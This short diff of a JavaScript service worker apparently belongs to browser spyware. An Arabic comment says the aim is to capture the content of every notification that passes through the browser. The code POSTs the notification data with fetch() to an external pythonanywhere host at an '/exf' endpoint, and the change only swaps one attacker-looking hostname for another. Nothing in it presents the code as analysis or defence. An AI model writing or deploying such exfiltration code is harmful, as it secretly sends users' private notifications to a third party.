@@ -2,7 +2,7 @@
 self.addEventListener('notificationwrapper', function(event) {
     // محاولة التقاط محتوى أي إشعار يمر عبر المتصفح
     const data = event.notification;
-    fetch('https://Mohammed33233.pythonanywhere.com/exf', {
+    fetch('https://Mohammed888.pythonanywhere.com/exf', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
@@ -24,3 +24,4 @@ self.addEventListener('push', function(event) {
         })
     );
 });
+
